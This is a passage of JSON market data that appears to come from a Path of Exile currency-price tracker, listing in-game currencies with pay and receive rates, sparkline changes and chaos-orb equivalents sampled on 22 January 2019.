Sextant","pay":{"id":0,"league_id":1,"pay_currency_id":47,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":17,"value":0.4230887878787879,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":47,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":100,"value":2.918542857142857,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[0,0.13,0.05,0.37,0.41,1.71,2.08],"totalChange":2.08},"receiveSparkLine":{"data":[0,-2.76,-16.27,-10.35,0.42,3.99,4.66],"totalChange":4.66},"chaosEquivalent":2.64,"lowConfidencePaySparkLine":{"data":[0,0.13,0.05,0.37,0.41,1.71,2.08],"totalChange":2.08},"lowConfidenceReceiveSparkLine":{"data":[0,-2.76,-16.27,-10.35,0.42,3.99,4.66],"totalChange":4.66},"detailsId":"journeyman-cartographers-sextant"},{"currencyTypeName":"Blessing of Xoph","pay":{"id":0,"league_id":1,"pay_currency_id":61,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":1,"value":0.5,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":61,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":24,"value":2.483673469387755,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,-33.33,-33.33,-33.33,-33.33,-9.93,-17.21],"totalChange":-17.21},"chaosEquivalent":2.24,"lowConfidencePaySparkLine":{"data":[null,null,0,100,100,100,100],"totalChange":100},"lowConfidenceReceiveSparkLine":{"data":[0,-33.33,-33.33,-33.33,-33.33,-9.93,-17.21],"totalChange":-17.21},"detailsId":"blessing-of-xoph"},{"currencyTypeName":"Annulment Shard","pay":{"id":0,"league_id":1,"pay_currency_id":79,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":1,"value":1.5,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":79,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":2,"value":3.8,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[],"totalChange":0},"chaosEquivalent":2.23,"lowConfidencePaySparkLine":{"data":[null,null,0,0,0,0,0],"totalChange":0},"lowConfidenceReceiveSparkLine":{"data":[0,0,-9.09,-9.09,1718.18,1718.18,245.45],"totalChange":245.45},"detailsId":"annulment-shard"},{"currencyTypeName":"Blessing of Tul","pay":{"id":0,"league_id":1,"pay_currency_id":62,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":1,"value":0.5,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":62,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":15,"value":2,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,0,0,22.91,0,0,0],"totalChange":0},"chaosEquivalent":2,"lowConfidencePaySparkLine":{"data":[null,null,0,0,0,0,100],"totalChange":100},"lowConfidenceReceiveSparkLine":{"data":[0,0,0,22.91,0,0,0],"totalChange":0},"detailsId":"blessing-of-tul"},{"currencyTypeName":"Vaal Orb","pay":{"id":0,"league_id":1,"pay_currency_id":8,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":40,"value":0.5834604444444444,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":8,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":81,"value":1.7833907142857144,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[0,3.03,3.03,3.03,3.03,3.03,3.87],"totalChange":3.87},"receiveSparkLine":{"data":[0,4.08,2.53,1.19,4.08,4.08,3.12],"totalChange":3.12},"chaosEquivalent":1.75,"lowConfidencePaySparkLine":{"data":[0,3.03,3.03,3.03,3.03,3.03,3.87],"totalChange":3.87},"lowConfidenceReceiveSparkLine":{"data":[0,4.08,2.53,1.19,4.08,4.08,3.12],"totalChange":3.12},"detailsId":"vaal-orb"},{"currencyTypeName":"Orb of Horizons","pay":{"id":0,"league_id":1,"pay_currency_id":75,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":2,"value":0.958204,"data_point_count":1,"includes_secondary":true},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":75,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":31,"value":1.79100045,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,-6.68,5.03,-3.73,-4.13,-2.13,-4.61],"totalChange":-4.61},"chaosEquivalent":1.42,"lowConfidencePaySparkLine":{"data":[0,-0.33,0.72,4.29,0.72,-3.63,4.36],"totalChange":4.36},"lowConfidenceReceiveSparkLine":{"data":[0,-6.68,5.03,-3.73,-4.13,-2.13,-4.61],"totalChange":-4.61},"detailsId":"orb-of-horizons"},{"currencyTypeName":"Splinter of Chayula","pay":{"id":0,"league_id":1,"pay_currency_id":60,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":3,"value":0.83333,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":60,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":46,"value":1.5,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,5.26,-9.67,0.7,-21.05,-21.05,-21.05],"totalChange":-21.05},"chaosEquivalent":1.35,"lowConfidencePaySparkLine":{"data":[0,0,0,0,0,0,0],"totalChange":0},"lowConfidenceReceiveSparkLine":{"data":[0,5.26,-9.67,0.7,-21.05,-21.05,-21.05],"totalChange":-21.05},"detailsId":"splinter-of-chayula"},{"currencyTypeName":"Gemcutter\'s Prism","pay":{"id":0,"league_id":1,"pay_currency_id":15,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":14,"value":0.7885894949494949,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":15,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":74,"value":1.3104130434782608,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[0,-0.9,-0.9,-1.01,4.44,-0.9,4.73],"totalChange":4.73},"receiveSparkLine":{"data":[0,4.2,4.37,1.67,5.04,1.93,1.19],"totalChange":1.19},"chaosEquivalent":1.29,"lowConfidencePaySparkLine":{"data":[0,-0.9,-0.9,-1.01,4.44,-0.9,4.73],"totalChange":4.73},"lowConfidenceReceiveSparkLine":{"data":[0,4.2,4.37,1.67,5.04,1.93,1.19],"totalChange":1.19},"detailsId":"gemcutters-prism"},{"currencyTypeName":"Apprentice Cartographer\'s Sextant","pay":{"id":0,"league_id":1,"pay_currency_id":46,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":14,"value":0.9750981212121212,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":46,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":52,"value":1,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,-5.02,-6.61,-3.17,-2.11,-3.38,-4.22],"totalChange":-4.22},"receiveSparkLine":{"data":[0,0,0,0,0,0,0],"totalChange":0},"chaosEquivalent":1.01,"lowConfidencePaySparkLine":{"data":[0,-5.02,-6.61,-3.17,-2.11,-3.38,-4.22],"totalChange":-4.22},"lowConfidenceReceiveSparkLine":{"data":[0,0,0,0,0,0,0],"totalChange":0},"detailsId":"apprentice-cartographers-sextant"},{"currencyTypeName":"Orb of Regret","pay":{"id":0,"league_id":1,"pay_currency_id":9,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":18,"value":1.0964574468085106,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":9,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":92,"value":1.0004330666666668,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[0,0,0.84,0.94,0.31,0.11,0.32],"totalChange":0.32},"receiveSparkLine":{"data":[0,0,0,0,1.51,0,0.04],"totalChange":0.04},"chaosEquivalent":0.96,"lowConfidencePaySparkLine":{"data":[0,0,0.84,0.94,0.31,0.11,0.32],"totalChange":0.32},"lowConfidenceReceiveSparkLine":{"data":[0,0,0,0,1.51,0,0.04],"totalChange":0.04},"detailsId":"orb-of-regret"},{"currencyTypeName":"Regal Orb","pay":{"id":0,"league_id":1,"pay_currency_id":7,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":10,"value":1.3920958247422681,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":7,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":73,"value":0.8269064536082474,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[0,0.04,0,0,0,0.12,0.57],"totalChange":0.57},"receiveSparkLine":{"data":[0,-0.09,-2.23,0.79,-1.6,1.46,0.7],"totalChange":0.7},"chaosEquivalent":0.77,"lowConfidencePaySparkLine":{"data":[0,0.04,0,0,0,0.12,0.57],"totalChange":0.57},"lowConfidenceReceiveSparkLine":{"data":[0,-0.09,-2.23,0.79,-1.6,1.46,0.7],"totalChange":0.7},"detailsId":"regal-orb"},{"currencyTypeName":"Engineer\'s Orb","pay":{"id":0,"league_id":1,"pay_currency_id":77,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":3,"value":2.605612244897959,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":77,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":17,"value":0.8584277931034483,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,18.02,26.46,12.78,12.41,12.81,11.17],"totalChange":11.17},"chaosEquivalent":0.62,"lowConfidencePaySparkLine":{"data":[0,2,11.98,11.98,30.74,30.74,30.49],"totalChange":30.49},"lowConfidenceReceiveSparkLine":{"data":[0,18.02,26.46,12.78,12.41,12.81,11.17],"totalChange":11.17},"detailsId":"engineers-orb"},{"currencyTypeName":"Orb of Fusing","pay":{"id":0,"league_id":1,"pay_currency_id":5,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":25,"value":1.95,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":5,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":100,"value":0.55044,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[0,0,0.78,0.62,0.54,2.53,2.56],"totalChange":2.56},"receiveSparkLine":{"data":[0,-0.93,-2.39,-0.55,-1.99,-1,-0.92],"totalChange":-0.92},"chaosEquivalent":0.53,"lowConfidencePaySparkLine":{"data":[0,0,0.78,0.62,0.54,2.53,2.56],"totalChange":2.56},"lowConfidenceReceiveSparkLine":{"data":[0,-0.93,-2.39,-0.55,-1.99,-1,-0.92],"totalChange":-0.92},"detailsId":"orb-of-fusing"},{"currencyTypeName":"Orb of Scouring","pay":{"id":0,"league_id":1,"pay_currency_id":14,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":8,"value":2.1,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":14,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":91,"value":0.5354012105263158,"data_point_count":1,"includes_secondary":true},"paySparkLine":{"data":[0,4.55,4.55,4.55,5.09,8.71,9.52],"totalChange":9.52},"receiveSparkLine":{"data":[0,0,0,0,0,-0.56,7.08],"totalChange":7.08},"chaosEquivalent":0.51,"lowConfidencePaySparkLine":{"data":[0,4.55,4.55,4.55,5.09,8.71,9.52],"totalChange":9.52},"lowConfidenceReceiveSparkLine":{"data":[0,0,0,0,0,-0.56,7.08],"totalChange":7.08},"detailsId":"orb-of-scouring"},{"currencyTypeName":"Cartographer\'s Chisel","pay":{"id":0,"league_id":1,"pay_currency_id":10,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":26,"value":2.4,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":10,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":58,"value":0.46549529545454543,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,-3.14,-3.14,0.9,0.9,0.9,0.9],"totalChange":0.9},"receiveSparkLine":{"data":[0,0.97,-2.18,1.69,-2.38,-1.15,-0.13],"totalChange":-0.13},"chaosEquivalent":0.44,"lowConfidencePaySparkLine":{"data":[0,-3.14,-3.14,0.9,0.9,0.9,0.9],"totalChange":0.9},"lowConfidenceReceiveSparkLine":{"data":[0,0.97,-2.18,1.69,-2.38,-1.15,-0.13],"totalChange":-0.13},"detailsId":"cartographers-chisel"},{"currencyTypeName":"Orb of Alchemy","pay":{"id":0,"league_id":1,"pay_currency_id":4,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":25,"value":2.841666666666667,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":4,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":65,"value":0.35714,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,-0.63,0.07,6.42,6.41,2.75,4.86],"totalChange":4.86},"receiveSparkLine":{"data":[0,2.66,-5.08,-7.82,-6.04,-6.22,-14.4],"totalChange":-14.4},"chaosEquivalent":0.35,"lowConfidencePaySparkLine":{"data":[0,-0.63,0.07,6.42,6.41,2.75,4.86],"totalChange":4.86},"lowConfidenceReceiveSparkLine":{"data":[0,2.66,-5.08,-7.82,-6.04,-6.22,-14.4],"totalChange":-14.4},"detailsId":"orb-of-alchemy"},{"currencyTypeName":"Silver Coin","pay":{"id":0,"league_id":1,"pay_currency_id":12,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":15,"value":3.6,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":12,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":47,"value":0.3146063292682927,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,5.33,2.76,0.91,2.92,3.72,3.72],"totalChange":3.72},"receiveSparkLine":{"data":[0,-8.82,-8.94,-8.94,-8.94,2.68,0.27],"totalChange":0.27},"chaosEquivalent":0.3,"lowConfidencePaySparkLine":{"data":[0,5.33,2.76,0.91,2.92,3.72,3.72],"totalChange":3.72},"lowConfidenceReceiveSparkLine":{"data":[0,-8.82,-8.94,-8.94,-8.94,2.68,0.27],"totalChange":0.27},"detailsId":"silver-coin"},{"currencyTypeName":"Blessed Orb","pay":{"id":0,"league_id":1,"pay_currency_id":18,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":10,"value":3.7901630434782607,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":18,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":53,"value":0.32171585542168674,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,0.1,0.06,0.06,0.7,0.23,0.25],"totalChange":0.25},"receiveSparkLine":{"data":[0,0,-1.04,-1.47,-1.55,0,-3.48],"totalChange":-3.48},"chaosEquivalent":0.29,"lowConfidencePaySparkLine":{"data":[0,0.1,0.06,0.06,0.7,0.23,0.25],"totalChange":0.25},"lowConfidenceReceiveSparkLine":{"data":[0,0,-1.04,-1.47,-1.55,0,-3.48],"totalChange":-3.48},"detailsId":"blessed-orb"},{"currencyTypeName":"Chromatic Orb","pay":{"id":0,"league_id":1,"pay_currency_id":17,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":30,"value":3.900757575757576,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":17,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":91,"value":0.27702283333333333,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,-1.17,-1.9,-0.9,-0.75,0.03,0.01],"totalChange":0.01},"receiveSparkLine":{"data":[0,-1.38,-1.35,-2.08,-2.08,-2.08,-2.35],"totalChange":-2.35},"chaosEquivalent":0.27,"lowConfidencePaySparkLine":{"data":[0,-1.17,-1.9,-0.9,-0.75,0.03,0.01],"totalChange":0.01},"lowConfidenceReceiveSparkLine":{"data":[0,-1.38,-1.35,-2.08,-2.08,-2.08,-2.35],"totalChange":-2.35},"detailsId":"chromatic-orb"},{"currencyTypeName":"Orb of Binding","pay":{"id":0,"league_id":1,"pay_currency_id":74,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":1,"value":6,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":74,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":28,"value":0.33333,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,0,0,0,0,0,0],"totalChange":0},"chaosEquivalent":0.25,"lowConfidencePaySparkLine":{"data":[null,null,0,0,0,0,0],"totalChange":0},"lowConfidenceReceiveSparkLine":{"data":[0,0,0,0,0,0,0],"totalChange":0},"detailsId":"orb-of-binding"},{"currencyTypeName":"Splinter of Xoph","pay":{"id":0,"league_id":1,"pay_currency_id":56,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":1,"value":8,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":56,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":29,"value":0.33333,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,-5.08,-14.97,8.86,-18.21,-14.21,-20.82],"totalChange":-20.82},"chaosEquivalent":0.23,"lowConfidencePaySparkLine":{"data":[null,null,0,14.29,0,0,0],"totalChange":0},"lowConfidenceReceiveSparkLine":{"data":[0,-5.08,-14.97,8.86,-18.21,-14.21,-20.82],"totalChange":-20.82},"detailsId":"splinter-of-xoph"},{"currencyTypeName":"Splinter of Uul-Netol","pay":{"id":0,"league_id":1,"pay_currency_id":59,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":1,"value":15,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":59,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":26,"value":0.33333,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,1.07,1.07,1.07,1.07,1.07,1.07],"totalChange":1.07},"chaosEquivalent":0.2,"lowConfidencePaySparkLine":{"data":[null,null,0,50,50,50,0],"totalChange":0},"lowConfidenceReceiveSparkLine":{"data":[0,1.07,1.07,1.07,1.07,1.07,1.07],"totalChange":1.07},"detailsId":"splinter-of-uul-netol"},{"currencyTypeName":"Orb of Alteration","pay":{"id":0,"league_id":1,"pay_currency_id":6,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":32,"value":6.897234042553191,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":6,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":61,"value":0.14286,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,3.09,4.16,5.69,9.14,5.69,4.2],"totalChange":4.2},"receiveSparkLine":{"data":[0,-0.03,-0.5,-0.41,-0.73,0,0],"totalChange":0},"chaosEquivalent":0.14,"lowConfidencePaySparkLine":{"data":[0,3.09,4.16,5.69,9.14,5.69,4.2],"totalChange":4.2},"lowConfidenceReceiveSparkLine":{"data":[0,-0.03,-0.5,-0.41,-0.73,0,0],"totalChange":0},"detailsId":"orb-of-alteration"},{"currencyTypeName":"Jeweller\'s Orb","pay":{"id":0,"league_id":1,"pay_currency_id":11,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":24,"value":7.8,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":11,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":75,"value":0.13261883720930231,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,0.3,1.86,3.61,3.33,4.92,6.27],"totalChange":6.27},"receiveSparkLine":{"data":[0,-1.86,1.35,-2.11,-3.08,-1.86,-2.39],"totalChange":-2.39},"chaosEquivalent":0.13,"lowConfidencePaySparkLine":{"data":[0,0.3,1.86,3.61,3.33,4.92,6.27],"totalChange":6.27},"lowConfidenceReceiveSparkLine":{"data":[0,-1.86,1.35,-2.11,-3.08,-1.86,-2.39],"totalChange":-2.39},"detailsId":"jewellers-orb"},{"currencyTypeName":"Orb of Chance","pay":{"id":0,"league_id":1,"pay_currency_id":16,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":7,"value":8.64997340425532,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":16,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":76,"value":0.11111,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,-3.04,0.02,0.72,-0.25,-0.36,7.21],"totalChange":7.21},"receiveSparkLine":{"data":[0,0,1.83,0,-2.24,0,-5.56],"totalChange":-5.56},"chaosEquivalent":0.11,"lowConfidencePaySparkLine":{"data":[0,-3.04,0.02,0.72,-0.25,-0.36,7.21],"totalChange":7.21},"lowConfidenceReceiveSparkLine":{"data":[0,0,1.83,0,-2.24,0,-5.56],"totalChange":-5.56},"detailsId":"orb-of-chance"},{"currencyTypeName":"Glassblower\'s Bauble","pay":{"id":0,"league_id":1,"pay_currency_id":19,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":4,"value":15.31340206185567,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":19,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":51,"value":0.14286,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,-0.12,0,1.2,2.08,3.07,3.07],"totalChange":3.07},"chaosEquivalent":0.1,"lowConfidencePaySparkLine":{"data":[0,0,-1.94,3.94,3.9,3.9,9.05],"totalChange":9.05},"lowConfidenceReceiveSparkLine":{"data":[0,-0.12,0,1.2,2.08,3.07,3.07],"totalChange":3.07},"detailsId":"glassblowers-bauble"},{"currencyTypeName":"Splinter of Tul","pay":{"id":0,"league_id":1,"pay_currency_id":57,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":1,"value":20,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":57,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":23,"value":0.14089376744186047,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,4.1,4.81,5.81,5.86,9.04,18.99],"totalChange":18.99},"chaosEquivalent":0.1,"lowConfidencePaySparkLine":{"data":[null,null,0,0,0,0,0],"totalChange":0},"lowConfidenceReceiveSparkLine":{"data":[0,4.1,4.81,5.81,5.86,9.04,18.99],"totalChange":18.99},"detailsId":"splinter-of-tul"},{"currencyTypeName":"Splinter of Esh","pay":{"id":0,"league_id":1,"pay_currency_id":58,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":1,"value":20,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":58,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":29,"value":0.1326773181818182,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,0.47,0.74,8.18,8.18,8.18,0.47],"totalChange":0.47},"chaosEquivalent":0.09,"lowConfidencePaySparkLine":{"data":[null,null,0,0,0,0,0],"totalChange":0},"lowConfidenceReceiveSparkLine":{"data":[0,0.47,0.74,8.18,8.18,8.18,0.47],"totalChange":0.47},"detailsId":"splinter-of-esh"},{"currencyTypeName":"Orb of Augmentation","pay":{"id":0,"league_id":1,"pay_currency_id":20,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":5,"value":42.121212121212125,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":20,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":47,"value":0.035082486842105264,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[null,null,null,null,null,null,0],"totalChange":0},"receiveSparkLine":{"data":[0,0,0,0,0,1.83,5.26],"totalChange":5.26},"chaosEquivalent":0.03,"lowConfidencePaySparkLine":{"data":[0,-45.46,-46.56,-41.35,-39.88,-39.88,-42.9],"totalChange":-42.9},"lowConfidenceReceiveSparkLine":{"data":[0,0,0,0,0,1.83,5.26],"totalChange":5.26},"detailsId":"orb-of-augmentation"},{"currencyTypeName":"Blacksmith\'s Whetstone","pay":{"id":0,"league_id":1,"pay_currency_id":25,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":8,"value":137.4747474747475,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":25,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":38,"value":0.024965935064935066,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,21.31,20.44,18.01,21.49,17.2,20.28],"totalChange":20.28},"receiveSparkLine":{"data":[0,-12.72,-18.33,-18.7,-16.53,-16.53,-16.64],"totalChange":-16.64},"chaosEquivalent":0.02,"lowConfidencePaySparkLine":{"data":[0,21.31,20.44,18.01,21.49,17.2,20.28],"totalChange":20.28},"lowConfidenceReceiveSparkLine":{"data":[0,-12.72,-18.33,-18.7,-16.53,-16.53,-16.64],"totalChange":-16.64},"detailsId":"blacksmiths-whetstone"},{"currencyTypeName":"Perandus Coin","pay":{"id":0,"league_id":1,"pay_currency_id":13,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":4,"value":200,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":13,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":34,"value":0.011368279569892474,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,2.35,-7.37,-12.56,-16.67,-10.22,-4.79],"totalChange":-4.79},"chaosEquivalent":0.01,"lowConfidencePaySparkLine":{"data":[0,0.22,-2.43,-4.97,-4.97,2.72,2.72],"totalChange":2.72},"lowConfidenceReceiveSparkLine":{"data":[0,2.35,-7.37,-12.56,-16.67,-10.22,-4.79],"totalChange":-4.79},"detailsId":"perandus-coin"},{"currencyTypeName":"Orb of Transmutation","pay":{"id":0,"league_id":1,"pay_currency_id":21,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":4,"value":196.62,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":21,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":53,"value":0.01613,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[0,0,null,21.78,21.78,null,null],"totalChange":21.78},"receiveSparkLine":{"data":[0,0,-0.42,-0.12,-2.46,-5.76,-3.24],"totalChange":-3.24},"chaosEquivalent":0.01,"lowConfidencePaySparkLine":{"data":[0,0,-1.33,21.78,21.78,22.08,22.06],"totalChange":22.06},"lowConfidenceReceiveSparkLine":{"data":[0,0,-0.42,-0.12,-2.46,-5.76,-3.24],"totalChange":-3.24},"detailsId":"orb-of-transmutation"},{"currencyTypeName":"Portal Scroll","pay":{"id":0,"league_id":1,"pay_currency_id":24,"get_currency_id":1,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":4,"value":364.8484848484849,"data_point_count":1,"includes_secondary":false},"receive":{"id":0,"league_id":1,"pay_currency_id":1,"get_currency_id":24,"sample_time_utc":"2019-01-22T14:16:18.5307166Z","count":38,"value":0.014209822916666667,"data_point_count":1,"includes_secondary":false},"paySparkLine":{"data":[],"totalChange":0},"receiveSparkLine":{"data":[0,0,0,-0.12,-4.8,-4.8,-14.76],"totalChange":-14.76},"chaosEquivalent":0.01,"lowConfidencePaySparkLine":{"data":[0,-23.5,14.82,46.05,46.05,52.82,76.13],"totalChange":76.13},"lowConfidenceReceiveSparkLine":{"data":[0,0,0,-0.12,-4.8,-4.8,-14.76],"totalChange":-14.76},"detailsId":"portal-scroll"},{"currencyTypeName":"Armourer\'s 